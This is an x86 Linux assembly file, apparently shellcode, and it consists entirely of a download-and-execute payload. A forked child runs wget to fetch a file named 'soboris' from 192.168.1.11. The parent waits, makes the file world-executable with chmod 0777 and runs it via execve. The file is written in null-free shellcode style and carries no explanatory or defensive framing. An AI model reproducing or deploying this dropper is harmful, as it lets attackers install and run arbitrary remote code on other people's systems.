        global _start
        section .text

_start:
        jmp path

soboris:
        pop esi

        ;fork
        xor eax,eax
        mov al,0x2
        int 0x80
        xor ebx,ebx
        cmp eax,ebx
        jz child

        ;wait(null)
        xor eax,eax
        mov al,0x7
        int 0x80

        ;nanosleep
        xor eax, eax
        xor edx, edx
        mov al, 162
        push edx
        push 2
        mov ebx, esp
        mov ecx, edx
        int 0x80

        ;chmod
        xor eax, eax
        xor edx, edx
        mov byte [esi+7], dl
        lea ebx, [esi]
        mov al, 15
        mov cx, 0777o
        int 0x80

        ;execve
        xor eax, eax
        mov dword [esi+8], esi
        mov dword [esi+12], eax
        lea ebx, [esi]
        mov al, 11
        lea ecx, [esi+8]
        lea edx, [esi+12]
        int 0x80

        ;exit
        xor eax, eax
        mov al, 1
        xor ebx, ebx
        int 0x80

path:
        call soboris
        db "soboris========="

child:
        push 0xb
        pop eax
        cdq
        push edx

        push 0x7369726f ;siro
        push 0x626f732f ;bos/
        push 0x31312e31 ;11.1
        push 0x2e383631 ;.861
        push 0x2e323931 ;.291
        mov ecx,esp
        push edx
    
        push 0x74 ;t
        push 0x6567772f ;egw/
        push 0x6e69622f ;nib/
        push 0x7273752f ;rsu/
        mov ebx,esp
        push edx
        push ecx
        push ebx
        mov ecx,esp
        int 0x80

